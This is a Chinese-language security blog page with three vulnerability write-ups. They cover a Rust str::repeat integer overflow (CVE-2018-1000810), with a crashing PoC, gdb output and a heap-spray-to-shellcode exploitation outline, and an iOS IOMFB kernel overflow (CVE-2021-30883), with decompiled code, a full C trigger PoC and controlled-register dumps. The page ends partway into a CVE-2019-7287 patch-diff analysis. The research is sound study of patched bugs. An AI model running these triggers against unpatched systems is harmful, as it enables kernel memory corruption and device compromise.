    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/01/05/CVE-2018-1000810-wildcopy-exploit/" class="post-title-link" itemprop="url">CVE-2018-1000810 wildcopy exploit</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-01-05 21:50:22" itemprop="dateCreated datePublished" datetime="2022-01-05T21:50:22+08:00">2022-01-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-01-09 16:35:12" itemprop="dateModified" datetime="2022-01-09T16:35:12+08:00">2022-01-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>再看<a target="_blank" rel="noopener" href="https://saaramar.github.io/IOMFB_integer_overflow_poc/">IOMFB_integer_overflow_poc</a>一文，但是对于最后的wildcopy操作不是很理解，决定先来看看wildcopy是什么，以及怎么利用。</p>
<p>这篇文章讲的是<a target="_blank" rel="noopener" href="https://github.com/rust-lang/rust/pull/54397">CVE-2018-1000810</a>，是在Rust标准库中发现的一个漏洞。这个错误是在 1.26.0 版本中引入的，并在 1.29.0 版本之后修复。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>repeat函数的整数溢出导致内存访问错误，POC：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; <span class="keyword">let</span> <span class="variable">_s</span> = <span class="string">&quot;AAAA&quot;</span>.<span class="title function_ invoke__">repeat</span>(<span class="number">0x4000000000000001</span>); &#125;</span><br></pre></td></tr></table></figure>

<p>解释一下，POC中的repeat函数将会将0x4000000000000001*4（这里会导致溢出）字节的数据写入到4字节中。</p>
<p>在gdb中，可以看到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x6072: file src/main.rs, line 2.</span><br><span class="line">Starting program: /mnt/c/projects/rust/exploit/target/debug/exploit</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, exploit::main () at src/main.rs:2</span><br><span class="line">2           <span class="built_in">let</span> _s = <span class="string">&quot;AAAA&quot;</span>.repeat(0xc000000000000001);</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">__memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:249</span><br><span class="line">249     ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: No such file or directory.</span><br><span class="line">(gdb) x/8i <span class="variable">$rip</span></span><br><span class="line">=&gt; 0x7ffffe92eb1f &lt;__memmove_avx_unaligned_erms+79&gt;:    rep movsb %ds:(%rsi),%es:(%rdi)</span><br><span class="line">   0x7ffffe92eb21 &lt;__memmove_avx_unaligned_erms+81&gt;:    retq</span><br><span class="line">   0x7ffffe92eb22 &lt;__memmove_avx_unaligned_erms+82&gt;:    cmp    <span class="variable">$0x10</span>,%dl</span><br><span class="line">   0x7ffffe92eb25 &lt;__memmove_avx_unaligned_erms+85&gt;:    jae    0x7ffffe92eb3e &lt;__memmove_avx_unaligned_erms+110&gt;</span><br><span class="line">   0x7ffffe92eb27 &lt;__memmove_avx_unaligned_erms+87&gt;:    cmp    <span class="variable">$0x8</span>,%dl</span><br><span class="line">   0x7ffffe92eb2a &lt;__memmove_avx_unaligned_erms+90&gt;:    jae    0x7ffffe92eb53 &lt;__memmove_avx_unaligned_erms+131&gt;</span><br><span class="line">   0x7ffffe92eb2c &lt;__memmove_avx_unaligned_erms+92&gt;:    cmp    <span class="variable">$0x4</span>,%dl</span><br><span class="line">   0x7ffffe92eb2f &lt;__memmove_avx_unaligned_erms+95&gt;:    jae    0x7ffffe92eb64 &lt;__memmove_avx_unaligned_erms+148&gt;</span><br><span class="line">(gdb) x/8gx <span class="variable">$rsi</span></span><br><span class="line">0x7ffffe400000: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7ffffe400010: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7ffffe400020: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7ffffe400030: 0x4141414141414141      0x4141414141414141</span><br><span class="line">(gdb) x/8gx <span class="variable">$rdi</span></span><br><span class="line">0x7ffffe600000: Cannot access memory at address 0x7ffffe600000</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>思路如下：</p>
<ol>
<li>先进行堆喷，用的是std::Vec，因为通过数组的值，可以实现任意读写；</li>
<li>触发漏洞，破坏其中一个的长度，根据这个长度，找到被破坏的数组下标；</li>
<li>通过被破坏的数组，找到子数组中包含感兴趣的值（0x7f0000000000）的数组下标，并记录该下标；<ol>
<li>使用子数组再破坏父数组中的某个数组的长度；</li>
</ol>
</li>
<li>找到父数组中长度被破坏的那个下标；</li>
<li>利用这两个被破坏的数组，实现任意读写；</li>
<li>写入shellcode，触发执行。</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/31/iOS-IOMFB-%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/31/iOS-IOMFB-%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">iOS IOMFB 整型溢出漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-31 23:47:38" itemprop="dateCreated datePublished" datetime="2021-12-31T23:47:38+08:00">2021-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-01-09 21:45:24" itemprop="dateModified" datetime="2022-01-09T21:45:24+08:00">2022-01-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞已经在iOS15.0.2中进行了修补，漏洞编号是CVE-2021-30883。这个漏洞厉害之处在于，能够通过应用程序沙箱及其他进程访问，相当适合越狱。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://saaramar.github.io/IOMFB_integer_overflow_poc/">https://saaramar.github.io/IOMFB_integer_overflow_poc/</a></p>
</blockquote>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>漏洞出现在<em>IOMFB::TableCompensator::BilerpGainTable::new_from_data</em>函数中，a3是用户传入的一个数组，在第30行，进行下标运算时，没有进行整数溢出检查：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall IOMFB::TableCompensator::BilerpGainTable::<span class="built_in">new_from_data</span>(__int64 a1, __int64 a2, <span class="type">int</span> a3, __int64 *a4, _QWORD *a5, <span class="type">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v_obj; <span class="comment">// x19</span></span><br><span class="line">  __int64 v13; <span class="comment">// x8</span></span><br><span class="line">  __int64 v14; <span class="comment">// x22</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// w8</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// w23</span></span><br><span class="line">  __int64 v17; <span class="comment">// x0</span></span><br><span class="line">  __int64 v18; <span class="comment">// x8</span></span><br><span class="line">  __int64 v_idx; <span class="comment">// x22</span></span><br><span class="line"></span><br><span class="line">  v_obj = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x60LL</span>);</span><br><span class="line">  *(_BYTE *)(v_obj + <span class="number">0x30</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)v_obj = off_FFFFFFF0078EF1D8;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x58</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">0x50</span>) = a6;</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">0x54</span>) = <span class="number">0</span>;</span><br><span class="line">  v13 = *a4;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x38</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x40</span>) = v13;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x48</span>) = *a5;</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">0x10</span>) = a3;</span><br><span class="line">  v14 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">0x140</span>);</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">32</span>) = v14;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    v15 = a3;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v15 = <span class="number">1</span>;</span><br><span class="line">  v16 = v15 * v14;</span><br><span class="line">  v_chunk = <span class="built_in">kalloc_ext</span>((<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">12</span> * v15 * v14 + <span class="number">4</span> * (v14 + a3))); <span class="comment">// &lt;-- WOW!</span></span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">40</span>) = v_chunk;</span><br><span class="line">  v18 = v_chunk + <span class="number">12LL</span> * v16;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">24</span>) = v18;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">8</span>) = v18 + <span class="number">4</span> * v14;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v_idx = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( IOMFB::TableCompensator::BilerpGainTable::<span class="built_in">set_table</span>(v_obj, v_idx, a1, a2) &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v_idx = (<span class="type">unsigned</span> <span class="type">int</span>)(v_idx + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v_idx &gt;= *(_DWORD *)(v_obj + <span class="number">16</span>) )</span><br><span class="line">        <span class="keyword">return</span> v_obj;</span><br><span class="line">    &#125;</span><br><span class="line">    (*(<span class="built_in">void</span> (__fastcall **)(__int64))(*(_QWORD *)v_obj + <span class="number">8LL</span>))(v_obj);</span><br><span class="line">    v_obj = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大多数操作数完全是由来自 EL0 的调用者控制的，而且计算的时候用的是32位大小：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FFFFFFF0098EF290 29 17 9F 1A CSINC           W9, W25, WZR, NE</span><br><span class="line">FFFFFFF0098EF294 09 7D 09 1B MUL             W9, W8, W9</span><br><span class="line">FFFFFFF0098EF298 96 01 80 52 MOV             W22, <span class="comment">#0xC</span></span><br><span class="line">FFFFFFF0098EF29C 29 7D 16 1B MUL             W9, W9, W22</span><br><span class="line">FFFFFFF0098EF2A0 08 01 19 0B ADD             W8, W8, W25</span><br><span class="line">FFFFFFF0098EF2A4 20 09 08 0B ADD             W0, W9, W8,LSL#2</span><br><span class="line">FFFFFFF0098EF2A8 13 83 9D 97 BL              kalloc_ext</span><br></pre></td></tr></table></figure>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>漏洞存在于<em>AppleMobileDispH12P</em>中，可以从<em>AppleCLCD</em>访问。这个漏洞可以从外部方法 78 访问此函数。POC在14.7.1 和 15.0上是可行的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">io_connect_t</span> <span class="title function_">get_iomfb_uc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">kern_return_t</span> ret;</span><br><span class="line">    <span class="type">io_connect_t</span> shared_user_client_conn = MACH_PORT_NULL;</span><br><span class="line">    <span class="type">int</span> type = <span class="number">0</span>;</span><br><span class="line">    <span class="type">io_service_t</span> service = IOServiceGetMatchingService(kIOMasterPortDefault,</span><br><span class="line">                                                       IOServiceMatching(<span class="string">&quot;AppleCLCD&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(service == MACH_PORT_NULL) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to open service\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> MACH_PORT_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] AppleCLCD service: 0x%x\n&quot;</span>, service);</span><br><span class="line"></span><br><span class="line">    ret = IOServiceOpen(service, mach_task_self(), type, &amp;shared_user_client_conn);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to open userclient: %s\n&quot;</span>, mach_error_string(ret));</span><br><span class="line">        <span class="keyword">return</span> MACH_PORT_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] AppleCLCD userclient: 0x%x\n&quot;</span>, shared_user_client_conn);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> shared_user_client_conn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_trigger</span><span class="params">(<span class="type">io_connect_t</span> iomfb_uc)</span> &#123;</span><br><span class="line">    <span class="type">kern_return_t</span> ret;</span><br><span class="line">    <span class="type">size_t</span> input_size = <span class="number">0x180</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint64_t</span> scalars[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *input = (<span class="type">char</span>*)<span class="built_in">malloc</span>(input_size);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc input&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0x41</span>, input_size);</span><br><span class="line">    *(<span class="type">int</span>*)input = <span class="number">0x3</span>;</span><br><span class="line">    </span><br><span class="line">    ret = IOConnectCallMethod(iomfb_uc, <span class="number">78</span>,</span><br><span class="line">                        scalars, <span class="number">2</span>,</span><br><span class="line">                        input, input_size,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ret != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s_set_block failed, ret == 0x%x --&gt; %s\n&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">poc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">io_connect_t</span> iomfb_uc = get_iomfb_uc();</span><br><span class="line">    <span class="keyword">if</span> (iomfb_uc == MACH_PORT_NULL) &#123;</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    do_trigger(iomfb_uc);</span><br><span class="line">    </span><br><span class="line">    IOServiceClose(iomfb_uc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="控制操作数"><a href="#控制操作数" class="headerlink" title="控制操作数"></a>控制操作数</h2><p>这里是通过逆向<em>IOMFB::TableCompensator::BilerpGainTable::new_from_data</em>函数来实现的，将POC简单的改一下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0x0</span>, input_size);</span><br><span class="line">    <span class="type">int</span> *pArr = (<span class="type">int</span>*)input;</span><br><span class="line"></span><br><span class="line">    pArr[<span class="number">0</span>] = <span class="number">0x3</span>;          <span class="comment">// sub-sub selector</span></span><br><span class="line">    pArr[<span class="number">1</span>] = <span class="number">0xffffffff</span>;   <span class="comment">// has to be non-zero</span></span><br><span class="line">    pArr[<span class="number">2</span>] = <span class="number">0x41414141</span>;</span><br><span class="line">    pArr[<span class="number">3</span>] = <span class="number">0x42424242</span>;</span><br><span class="line">    pArr[<span class="number">8</span>] = <span class="number">0x43434343</span>;</span><br><span class="line">    pArr[<span class="number">89</span>] = <span class="number">0x44444444</span>;</span><br><span class="line">    </span><br><span class="line">    ret = <span class="built_in">IOConnectCallMethod</span>(iomfb_uc, <span class="number">78</span>,</span><br><span class="line">                        scalars, <span class="number">2</span>,</span><br><span class="line">                        input, input_size,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>寄存器信息如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">(lldb) reg <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">        x0 = 0xffffffe4cbaa4420</span><br><span class="line">        x1 = 0x0000000000000060</span><br><span class="line">        x2 = 0x0000000000000020</span><br><span class="line">        x3 = 0x0000000000000060</span><br><span class="line">        x4 = 0x0000000000000000</span><br><span class="line">        x5 = 0x0000000043434343 // &lt;-- controlled</span><br><span class="line">        x6 = 0xfffffff00991adac</span><br><span class="line">        x7 = 0x0000000000006eb1</span><br><span class="line">        x8 = 0x0000000044444444 // &lt;-- controlled</span><br><span class="line">        x9 = 0x000000000000000b</span><br><span class="line">       x10 = 0xffffffe802224000</span><br><span class="line">       x11 = 0x3ffffff932ea900b</span><br><span class="line">       x12 = 0x0000000000000000</span><br><span class="line">       x13 = 0x00000000000001dc</span><br><span class="line">       x14 = 0x0000000000003320</span><br><span class="line">       x15 = 0x0000000000008001</span><br><span class="line">       x16 = 0xffbd7ff007a542d8</span><br><span class="line">       x17 = 0x182effe4cbaa4420</span><br><span class="line">       x18 = 0x0000000000000000</span><br><span class="line">       x19 = 0xffffffe4cbaa4420</span><br><span class="line">       x20 = 0x0000000042424242 // &lt;-- controlled</span><br><span class="line">       x21 = 0xffffffe4ccf02b00</span><br><span class="line">       x22 = 0x0000000043434343 // &lt;-- controlled</span><br><span class="line">       x23 = 0xffffffe4ccf02af4</span><br><span class="line">       x24 = 0xffffffe4ccf02aec</span><br><span class="line">       x25 = 0x0000000041414141 // &lt;-- controlled</span><br><span class="line">       x26 = 0x0000000000000000</span><br><span class="line">       x27 = 0xffffffe81869b648</span><br><span class="line">       x28 = 0xffffffe199dd5608</span><br><span class="line">       x29 = 0xffffffe81869b4b0</span><br><span class="line">       x30 = 0xfffffff0098ef23c</span><br><span class="line">        sp = 0xffffffe81869b470</span><br><span class="line">        pc = 0xfffffff0098ef290</span><br><span class="line">      cpsr = 0x20400204</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/22/iOS-ProvInfoIOKitUserClient%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/22/iOS-ProvInfoIOKitUserClient%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">iOS ProvInfoIOKitUserClient漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-22 21:29:49" itemprop="dateCreated datePublished" datetime="2021-12-22T21:29:49+08:00">2021-12-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-12-31 23:29:55" itemprop="dateModified" datetime="2021-12-31T23:29:55+08:00">2021-12-31</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞是CVE-2019-7287，已在 iOS 12.1.4 中进行了修复，这里是通过对比iOS 12.1.3 和 iOS 12.1.4 内核的差异性，来寻找漏洞点。</p>
<p>经过对比，判断漏洞点应该是在<strong>ProvInfoIOKitUserClient::ucGetEncryptedSeedSegment</strong>中，下面是iOS12.1.3中的：</p>
<p><img src="https://www.antid0te.com/images/ProvInfo_Unfixed.png"></p>
<p>下面是iOS12.1.4中的：</p>
<p><img src="https://www.antid0te.com/images/ProvInfo_Fixed.png"></p>
<p>可以看到加入了对a2[30]的大小的检查。</p>
<h1 id="ProvInfoIOKitUserClient"><a href="#ProvInfoIOKitUserClient" class="headerlink" title="ProvInfoIOKitUserClient"></a>ProvInfoIOKitUserClient</h1><p>IOKit 对象<strong>ProvInfoIOKit</strong>和<strong>ProvInfoIOKitUserClient</strong>在<strong>com.apple.driver.ProvInfoIOKit</strong>的驱动程序中实现。无法从运行 iOS 应用程序的普通<strong>容器</strong>沙箱，创建与驱动程序的连接。漏洞利用需要沙箱逃逸，或者，可以利用具有对该驱动程序的合法访问权限的进程。检查 iOS 12 附带的沙箱配置文件后发现，允许访问此驱动程序的三个守护进程沙箱。这些守护进程沙箱是：</p>
<ol>
<li>findmydeviced</li>
<li>mobileactivationd</li>
